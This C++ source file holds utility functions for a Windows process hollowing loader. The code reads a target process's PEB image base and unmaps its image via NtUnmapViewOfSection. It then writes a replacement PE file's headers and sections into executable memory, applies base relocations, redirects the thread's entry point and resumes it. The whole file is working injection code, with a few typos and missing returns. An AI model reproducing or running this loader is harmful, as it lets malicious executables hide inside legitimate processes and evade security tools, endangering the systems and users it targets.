#include "utils.h"

inline DWORD64 Utils::Error(const std::string& errMsg) {
	std::cout << "[-] " << errMsg << ":" << GetLastError() << "\n";
	return EXIT_FAILURE;
}

BOOL Utils::getContext(HANDLE hThread, CONTEXT &ctx) {
	return GetThreadContext(hThread, &ctx);
}


std::optional<LPVOID> Utils::readProcessMemory(HANDLE hProcess, DWORD64 pebAddr) {
	DWORD64 imageBaseP = (DWORD64)pebAddr + 16;
	LPVOID imageBaseAddr = NULL;
	if (!ReadProcessMemory(hProcess, (LPCVOID)imageBaseP, &imageBaseAddr, sizeof(DWORD64), NULL)) {
		Utils::Error("Failed read process memory");
		return std::nullopt;
	}
	return (LPVOID)imageBaseAddr;

}

DWORD64 Utils::unmapProcess(HMODULE dll, HANDLE hProcess, LPVOID imageBaseAddr) {
	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(dll, "NtUnmapViewOfSection");
	if (!NtUnmapViewOfSection) {
		return Utils::Error("Failed find function NtUnmapViewOfSection");
	}

	if (!NT_SUCCESS(NtUnmapViewOfSection(hProcess, imageBaseAddr))) {
		return Utils::Error("Failed unmap process");
	}
	return EXIT_SUCCESS;
}

PBYTE Utils::readFile(LPSTR filename) {
	HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD bufferSize = 0;
	if (hFile == INVALID_HANDLE_VALUE) {
		return 0;
	}
	
	DWORD getFileSizeRes = GetFileSize(hFile, NULL);
	if (getFileSizeRes == INVALID_FILE_SIZE) {
		return 0;
	}
	SetFilePointer( hFile, 0, NULL, FILE_BEGIN ); 
	PBYTE pBuffer = new BYTE[getFileSizeRes];
	DWORD  bytes_read = 0;
	if (!ReadFile(hFile, pBuffer, getFileSizeRes, &bytes_read , NULL)) {
		return 0;
	}
	return pBuffer;
}

inline PIMAGE_NT_HEADERS64 GetNTHeaders(DWORD64 dwImageBase)
{
	return (PIMAGE_NT_HEADERS64)(dwImageBase +
		((PIMAGE_DOS_HEADER)dwImageBase)->e_lfanew);
}

BOOL Utils::mapFile(std::unique_ptr<SafeHandle>& safeHandle, PBYTE buffer, LPVOID imageBaseAddr, PE_IMAGE &pe_image) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;
	PIMAGE_NT_HEADERS64 pNTHeaders = GetNTHeaders((DWORD64)buffer);

	LPVOID address = VirtualAllocEx(safeHandle.get()->getProcess(), imageBaseAddr, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!address) {
		Utils::Error("Failed allocate memory");
	}

	DWORD_PTR dwDelta = (DWORD_PTR)imageBaseAddr - pNTHeaders->OptionalHeader.ImageBase;

	pNTHeaders->OptionalHeader.ImageBase = (DWORD_PTR)imageBaseAddr;
	if (!WriteProcessMemory(safeHandle.get()->getProcess(), imageBaseAddr, (LPVOID)buffer, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
		Utils::Error("Failed write process memory");
	}

	PIMAGE_SECTION_HEADER section_head = NULL;

	for ( int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; ++i)
	{
		section_head = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (!WriteProcessMemory(safeHandle.get()->getProcess(), (PVOID)((LPBYTE)address + section_head->VirtualAddress), (PVOID)((LPBYTE)buffer + section_head->PointerToRawData), section_head->SizeOfRawData, NULL)) {
			Utils::Error("Error Wriring section");
		}
	}
	
	if (dwDelta) {
		for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++)
		{
			section_head = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

			char pSectionName[] = ".reloc";
			if (memcmp(section_head->Name, pSectionName, strlen(pSectionName))) {
				continue;
			}

			DWORD RelocAddress = section_head->PointerToRawData;
			IMAGE_DATA_DIRECTORY RelocData = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			DWORD Offset = 0;

			while (Offset < RelocData.Size) {

				PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&buffer[RelocAddress + Offset];
				Offset += sizeof(BASE_RELOCATION_BLOCK);
				DWORD EntryCount = (pBlockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&buffer[RelocAddress + Offset];

				for (int x = 0; x < EntryCount; x++)
				{
					Offset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[x].Type == 0) {
						Utils:Error("The Type Of Base Relocation Is 0. Skipping");
						continue;
					}

					DWORD FieldAddress = pBlockHeader->PageAddress + pBlocks[x].Offset;

					DWORD64 EnrtyAddress = 0;
					ReadProcessMemory(safeHandle.get()->getProcess(), (PVOID)((DWORD64)imageBaseAddr + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);

					EnrtyAddress += dwDelta;
					if (!WriteProcessMemory(safeHandle.get()->getProcess(), (PVOID)((DWORD64)imageBaseAddr + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)) {
						Error("Error Writing Entry");
					}

				}
			}
		}
	}

	pe_image.address = address;
	pe_image.pNTHeaders = pNTHeaders;
	return TRUE;
}

BOOL Utils::WriteImageBase(std::unique_ptr<SafeHandle>& safeHandle, CONTEXT &ctx, PE_IMAGE &pe_image) {
	if (!WriteProcessMemory(safeHandle.get()->getProcess(), (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pe_image.pNTHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL)) {
		Utils:Error("Error Writing Entry.");
	}

	DWORD64 EntryPoint = (DWORD64)((LPBYTE)pe_image.address + pe_image.pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	ctx.Rcx = EntryPoint;
	return TRUE;
}


BOOL Utils::setContextAndResumeThread(std::unique_ptr<SafeHandle>& safeHandle, CONTEXT& ctx) {
	if (!SetThreadContext(safeHandle.get()->getThread(), &ctx)) {
		Utils:Error("Error setting context");
		return 0;
	}

	if (!ResumeThread(safeHandle.get()->getThread())) {
		Error("Error resuming thread");
		return 0;
	}
}